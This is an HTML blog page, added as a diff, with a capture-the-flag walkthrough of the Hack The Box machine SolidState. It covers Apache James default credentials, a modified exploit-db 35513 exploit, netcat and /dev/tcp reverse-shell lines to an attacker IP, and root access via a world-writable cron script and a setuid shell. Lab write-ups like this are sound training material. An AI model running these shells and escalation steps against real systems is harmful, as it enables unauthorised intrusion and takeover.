@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Unboxing SolidState :: APPSECRADAR :: HACKING | CODING | BLOGS &amp; GOOD VIBES</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Introduction: Unboxing SolidState; a fun box by creator ch33zplz - This wasn&amp;rsquo;t my first box on HTB but still I&amp;rsquo;ll start my blog series with this. You will come to know why I am giving such an honour to this box. Just stay with me till the end. I thoroughly enjoyed solving this box &amp;amp; the &amp;lsquo;State&amp;rsquo; of satisfaction after getting root was totally something else! I promise, by the end, it will be a &amp;lsquo;Solid&amp;rsquo; stroll down your memory lane!"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/htb-walkthrough-solidstate/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/arrow-p-2.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Unboxing SolidState"/>
+<meta name="twitter:description" content="Unboxing [SolidState](https://www.hackthebox.eu/home/machines/profile/85  &#34;Hack The Box - SolidState&#34;); a fun box by creator [ch33zplz](https://www.hackthebox.eu/home/users/profile/3338) - This wasn&#39;t my first box on HTB but still I&#39;ll start my blog series with this. You will come to know why I am giving such an honour to this box. Just stay with me till the end. I thoroughly enjoyed solving this box &amp; the &#39;State&#39; of satisfaction after getting root was totally something else! I promise, by the end, it will be a &#39;Solid&#39; stroll down your memory lane!"/>
+
+
+
+<meta property="og:title" content="Unboxing SolidState" />
+<meta property="og:description" content="Unboxing [SolidState](https://www.hackthebox.eu/home/machines/profile/85  &#34;Hack The Box - SolidState&#34;); a fun box by creator [ch33zplz](https://www.hackthebox.eu/home/users/profile/3338) - This wasn&#39;t my first box on HTB but still I&#39;ll start my blog series with this. You will come to know why I am giving such an honour to this box. Just stay with me till the end. I thoroughly enjoyed solving this box &amp; the &#39;State&#39; of satisfaction after getting root was totally something else! I promise, by the end, it will be a &#39;Solid&#39; stroll down your memory lane!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/htb-walkthrough-solidstate/" />
+<meta property="article:published_time" content="2020-04-12T10:48:17+05:30" />
+<meta property="article:modified_time" content="2020-04-12T10:48:17+05:30" /><meta property="og:site_name" content="APPSECRADAR :: HACKING | CODING | BLOGS &amp; GOOD VIBES" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">appsecradar.net</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">about</a></li>
+        
+      
+        
+          <li><a href="/contact">contact</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">about</a></li>
+      
+    
+      
+        <li><a href="/contact">contact</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h2 class="post-title"><a href="/posts/htb-walkthrough-solidstate/">Unboxing SolidState</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-04-12
+        </span>
+
+        
+          
+        
+      
+
+      <span class="post-author">— by Kshitij Badkas</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/htb/">HTB</a>&nbsp;
+        
+          #<a href="/tags/unbox/">unbox</a>&nbsp;
+        
+          #<a href="/tags/oscp/">OSCP</a>&nbsp;
+        
+          #<a href="/tags/linux/">linux</a>&nbsp;
+        
+          #<a href="/tags/medium/">medium</a>&nbsp;
+        
+          #<a href="/tags/ctf/">CTF</a>&nbsp;
+        
+          #<a href="/tags/real-life/">real-life</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/img/solidstate/solidstate.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <!-- raw HTML omitted -->
+<h3 id="introduction">Introduction:</h3>
+<p>Unboxing <a href="https://www.hackthebox.eu/home/machines/profile/85" title="Hack The Box - SolidState">SolidState</a>; a fun box by creator <a href="https://www.hackthebox.eu/home/users/profile/3338">ch33zplz</a> - This wasn&rsquo;t my first box on HTB but still I&rsquo;ll start my blog series with this. You will come to know why I am giving such an honour to this box. Just stay with me till the end. I thoroughly enjoyed solving this box &amp; the &lsquo;State&rsquo; of satisfaction after getting root was totally something else! I promise, by the end, it will be a &lsquo;Solid&rsquo; stroll down your memory lane!</p>
+<blockquote>
+<p><em>Disclaimer: All the content posted here is strictly for educational purposes only. The author is not responsible for any harm caused using this content in any other way apart from the one intented.</em></p>
+</blockquote>
+<h3 id="recon">Recon:</h3>
+<ol>
+<li>
+<p>The very first thing we&rsquo;ll do is to nmap our IP.</p>
+<pre><code>nmap -sV -sC 10.10.10.51 -oA nmap-initial -vv
+</code></pre><p><img src="/img/solidstate/nmap-1.png" alt="img"></p>
+<p>We observe that port 25 - SMTP - is using James service.</p>
+<blockquote>
+<p><a href="https://en.wikipedia.org/wiki/Apache_James">Apache James</a>, a.k.a. Java Apache Mail Enterprise Server or some variation thereof, is an open source SMTP and POP3 mail transfer agent and NNTP news server written entirely in Java.</p>
+<p><em>from Wikipedia</em></p>
+</blockquote>
+</li>
+<li>
+<p>We will also scan all ports. This will take a while to finish.</p>
+<pre><code>nmap -sV -p- -T5 10.10.10.51 -oA nmap-allports -vv
+</code></pre><p><img src="/img/solidstate/nmap-2.png" alt="img"></p>
+<p>We have a bunch of ports open but we are interested only till port 4555.</p>
+</li>
+<li>
+<p>Next, we will perform port-enum on open ports using nmap&rsquo;s NSE.
+Performing vulnerable script scan on the open ports.</p>
+<pre><code>nmap -p22,25,80,110,119,4555 --script vuln 10.10.10.51 -oA nmap-ports -vv
+</code></pre><p><img src="/img/solidstate/failed.png" alt="img"></p>
+<p>Execution failed!</p>
+</li>
+<li>
+<p>There are some known exploits from exploitDB and we&rsquo;re interested in
+<a href="https://www.exploit-db.com/exploits/35513" title="https://www.exploit-db.com/exploits/35513">RCE Apache James Server 2.3.2 - 35513.py</a> exploit.</p>
+<p><img src="/img/solidstate/james-exploit.png" alt="img"></p>
+</li>
+<li>
+<p>As we can see from the image above, James Remote Administration Tool uses default credentials (root/root). <em>I had tried some examples of default credentials before trying &lsquo;root&rsquo;.</em></p>
+<p>Let&rsquo;s &lsquo;nc&rsquo; 4555 using the default credentials.</p>
+<pre><code>nc 10.10.10.51 4555
+</code></pre><p>at the prompt use</p>
+<pre><code>root
+</code></pre><p>as both username and password.</p>
+<p><img src="/img/solidstate/nc-1.png" alt="img"></p>
+</li>
+<li>
+<pre><code>listusers
+</code></pre><p>This command will show the list of exisiting users.</p>
+<p><img src="/img/solidstate/listusers.png" alt="img"></p>
+</li>
+</ol>
+<blockquote>
+<hr>
+<p>End of Recon.</p>
+<hr>
+</blockquote>
+<h3 id="getting-the-user-flag-foothold">Getting the User Flag (Foothold):</h3>
+<h4 id="approach-1">Approach 1:</h4>
+<ol>
+<li>
+<p>On visiting the URL 10.10.10.51, at the bottom of the page, we see a form containing the following fields :
+<code>Name</code> <code>E-mail</code> and <code>Message</code>.</p>
+<p><img src="/img/solidstate/mail-page.png" alt="img"></p>
+</li>
+<li>
+<p>We will try to E-mail using <code>Thunderbird</code>. Before that let&rsquo;s change the password for user <code>mindy</code> using <code>setpassword</code> command</p>
+<pre><code>setpassword &lt;user&gt; &lt;pass&gt;
+</code></pre><p><img src="/img/solidstate/setpassword.png" alt="img"></p>
+</li>
+<li>
+<p>Now, in <code>Thunderbird</code>:</p>
+<p><img src="/img/solidstate/thunderbird-2.png" alt="img"></p>
+<p><img src="/img/solidstate/thunderbird-3.png" alt="img"></p>
+</li>
+<li>
+<p>You&rsquo;ve Got Mail!.. And received SSH credentials!</p>
+<p><img src="/img/solidstate/thunderbird-4.png" alt="img"></p>
+</li>
+<li>
+<p>We will login with ssh using the credentials received in the mail.</p>
+<pre><code>ssh mindy@10.10.10.51
+P@55W0rd1!2@
+</code></pre><p><img src="/img/solidstate/ssh-1.png" alt="nmap result"></p>
+</li>
+<li>
+<p>And get the <code>user.txt</code></p>
+<pre><code>ls
+</code></pre><p><img src="/img/solidstate/ssh-user.png" alt="nmap result"></p>
+</li>
+</ol>
+<blockquote>
+<hr>
+<p>End of Approach 1</p>
+<hr>
+</blockquote>
+<h4 id="approach-2">Approach 2:</h4>
+<ol>
+<li>
+<p>Using <code>searchsploit</code></p>
+<pre><code>searchsploit james
+</code></pre><p><img src="/img/solidstate/alt-user-1.png" alt="nmap result"></p>
+</li>
+<li>
+<pre><code>searchsploit -m exploits/linux/remote/35513.py  
+</code></pre><p>mirrors the exploit into the current working directory.</p>
+<p><img src="/img/solidstate/alt-user-2.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Now we edit the &lsquo;payload&rsquo; as shown in the image. Choose either of these two :</p>
+<pre><code>nc -e /bin/bash 10.10.14.2 1234
+</code></pre><p><em>OR</em></p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/&lt;local IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
+</code></pre><p>We commented the original payload and entered the new one.</p>
+<p><img src="/img/solidstate/alt-user-3.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Running it</p>
+<p><img src="/img/solidstate/alt-user-4_1.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Starting a listener in a new terminal before the ssh login to get a <code>reverse shell</code>.</p>
+<pre><code>nc -lvnp 1234
+</code></pre></li>
+<li>
+<p>And then logging in through <code>ssh</code></p>
+<p><img src="/img/solidstate/alt-user-4_2.png" alt="nmap result"></p>
+</li>
+<li>
+<p>The shell returned successfully.</p>
+<p><img src="/img/solidstate/alt-user-6.png" alt="nmap result"></p>
+</li>
+</ol>
+<blockquote>
+<hr>
+<p>End of Approach 2.</p>
+<p>So this was another way of getting the user flag.</p>
+<hr>
+</blockquote>
+<h3 id="getting-the-root-flag-privilege-escalation">Getting the Root Flag (Privilege Escalation):</h3>
+<h4 id="approach-1-1">Approach 1:</h4>
+<ol>
+<li>
+<p>Fantastic! We have the user flag. Let&rsquo;s continue but we observe that some commands will be restricted. User <code>mindy</code> must be using <code>'rbash'</code> or restricted bash.
+Let&rsquo;s see the <code>/etc/passwd</code> file containing the list of users.</p>
+<p><img src="/img/solidstate/ssh-3.png" alt="nmap result"></p>
+</li>
+<li>
+<p><code>mindy</code> is using rbash, while <code>james</code> is using full bash. To convert rbash to full bash use</p>
+<pre><code>ssh &lt;user&gt;@10.10.10.51 -t &quot;bash --noprofile&quot;
+</code></pre><p>when logging in.</p>
+<p><img src="/img/solidstate/ssh-4.png" alt="nmap result"></p>
+<blockquote>
+<p>&ndash;noprofile:  Do not read either the system-wide startup file /etc/profile or any of the personal initialization files ~/.bash_profile, ~/.bash_login, or ~/.profile.
+By default, bash reads these files when it is invoked as a login shell.</p>
+</blockquote>
+<p>Another way is to use just the &ldquo;bash&rdquo; after ssh without the &ldquo;&ndash;noprofile&rdquo; but when I tried it I didn&rsquo;t get any response.
+<img src="/img/solidstate/ssh-5.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Moving on, using <a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a> to enumerate my target system.<br>
+I had the file on my local machine so I downloaded the file to the target machine using <code>Python SimpleHTTPServer</code>.</p>
+<p><img src="/img/solidstate/linenum-1.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Running it using <code>-t</code> for thorough results. After running it, we will find <code>/opt/tmp.py</code>.</p>
+<pre><code>./LinEnum.sh -t
+</code></pre><p><img src="/img/solidstate/ssh-7.png" alt="nmap result"></p>
+<p>It&rsquo;s been given <code>rwx</code> permissions to all. i.e chmod 777.</p>
+</li>
+<li>
+<p>We observe that 631 is listenening on localhost. It&rsquo;s a potential for privesc, if we find out who is active on 631.</p>
+<p><img src="/img/solidstate/ssh-8.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Now, let&rsquo;s have a look at <code>/opt/tmp.py</code></p>
+<p><img src="/img/solidstate/ssh-9.png" alt="nmap result"></p>
+<p>It clears the <code>/tmp folder</code> upon execution, we can modify this program for Privelege Escalation.</p>
+</li>
+<li>
+<p>Before we use our exploit payload, we will perform a short demonstration to verify whether we can get a shell.
+Start a listener on the local machine</p>
+<pre><code>nc -lvnp 1234
+</code></pre></li>
+<li>
+<p>On the SolidState box (target), using <code>nc</code> with program to execute after the connection which is dangerous!!</p>
+<pre><code>nc -e /bin/bash 10.10.14.2 1234
+</code></pre></li>
+<li>
+<p>And it works!</p>
+<p><img src="/img/solidstate/pe-1.png" alt="nmap result"></p>
+</li>
+<li>
+<p>So now we will copy this script  in the /opt/tmp.py</p>
+<pre><code>nc -e /bin/bash 10.10.14.2 1234
+</code></pre><blockquote>
+<p>Note: For me, <code>vi</code> was behaving weirdly, backspace not working, etc., luckily, the box has <code>nano</code> in it.</p>
+</blockquote>
+<p>We put the payload in <code>/opt/tmp.py</code></p>
+<p><img src="/img/solidstate/pe-2.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Starting the listener on our local machine like before and waited till the connection was established and we got the root shell.<br>
+Enter &lsquo;id&rsquo; command to confirm.</p>
+<pre><code>id
+</code></pre><p><img src="/img/solidstate/pe-3.png" alt="nmap result"></p>
+</li>
+</ol>
+<blockquote>
+<p>Why did it give us root?</p>
+<p><code>/opt/tmp.py</code> is owned by <code>root</code> and had set <code>rwx</code> permissions to all - UGO - User Group Others.
+So when this file containg a payload is executed, it will return a root shell.</p>
+<p>We can use this payload as well from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" title="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a> :
+​<code>bash -i &gt;&amp; /dev/tcp/&lt;local IP&gt;/&lt;PORT&gt; 0&gt;&amp;1</code></p>
+</blockquote>
+<blockquote>
+<hr>
+<p>End of Approach 1</p>
+<hr>
+</blockquote>
+<h4 id="approach-2-1">Approach 2:</h4>
+<ol>
+<li>
+<p>Edit the /opt/tmp.py and use this payload as shown in the image below.</p>
+<pre><code>chmod 4755 /bin/dash
+</code></pre><p><img src="/img/solidstate/alt-pe-1.png" alt="nmap result"></p>
+</li>
+<li>
+<pre><code>ls -la /bin/dash
+</code></pre><p>We observe the <code>rws</code> permissions and that the owner is root.</p>
+<p><img src="/img/solidstate/alt-pe-2.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Now just execute the &lsquo;dash&rsquo; command and we have the privelege escalation successfully.</p>
+<pre><code>dash
+</code></pre><p>Observe the <code>effective UID</code> is set to &lsquo;0&rsquo; i.e <code>root</code>.</p>
+<p><img src="/img/solidstate/alt-pe-3.png" alt="nmap result"></p>
+</li>
+<li>
+<p>Simpler way is to write this payload instead of &lsquo;/bin/dash&rsquo;</p>
+<pre><code>chmod 4755 /bin/sh
+</code></pre><p>and run using</p>
+<pre><code>sh
+</code></pre><p>to get <code>root</code>.</p>
+</li>
+</ol>
+<blockquote>
+<hr>
+<p>End of Approach 2.</p>
+<p>The End.</p>
+<hr>
+</blockquote>
+<h3 id="closing-remarks">Closing Remarks</h3>
+<p>Thanks for being with me this far. I hope you enjoyed this &lsquo;unboxing&rsquo; as much as I did. It was a pretty straightforward box and it had a good flow. One thing led to another and so on.</p>
+<blockquote>
+<h4 id="takeaways">Takeaways:</h4>
+<ol>
+<li>We learnt the vulnerability of Apache James server.</li>
+<li>We understood the usage of <code>nc</code> and <code>ssh</code>.</li>
+<li>We got to know more than 1 approach for finding both the &lsquo;user&rsquo; &amp; &lsquo;root&rsquo; flags.</li>
+</ol>
+</blockquote>
+<p>Lastly, I hope I was clear and you felt that this writeup is in depth and comprehensive.</p>
+<p>I will be updating this article with refined &lsquo;navigational links&rsquo; very soon.</p>
+<p>Please provide your feedback if you like it or have any suggestions.</p>
+<p>Please let me know of any typos, mistakes, improvements, screenshot errors, etc. I will be putting a &lsquo;Disqus&rsquo; box very soon as well.</p>
+<p>You can find my details on the <a href="https://appsecradar.net/contact/" title="Contact Me">contact</a> page.</p>
+<p>Please share this post on your favourite social-media platforms and with your friends.</p>
+<blockquote>
+<p>Many thanks once again.</p>
+<p>And please remember, &ldquo;with great power comes great responsibility&rdquo;.</p>
+<p>Good-bye until next time.</p>
+<blockquote>
+<p><em>Stay n00b. Stay Humble</em>.</p>
+</blockquote>
+</blockquote>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/welcome/">
+                  <span class="button__text">appsecradar welcomes you</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <div>  
+    <a href="http://astromedicomp.org"><p style = "font-family:inter; font-size:30px; font-weight: bold;">"Knowledge is Inter-related"</p></a>
+    <a href="http://astromedicomp.org/dr-vijay-gokhale/technical-credentials"><p style = "font-family:inter; font-size:20px; font-weight: bold;"> - Dr. Vijay Gokhale</p></a>
+</div>
+
+<hr>
+
+<div>
+    <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0; display: block;margin-left: auto; margin-right: auto;" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a>
+    <br>This work is licensed under a<br>
+    <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>
+</div>
+
+<footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">appsecradar.net</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 by Kshitij Badkas. Some rights reserved.</span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+
+      </div>
+    
+  </div>
+
+
+
+
+
+
+</footer>
+
+
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
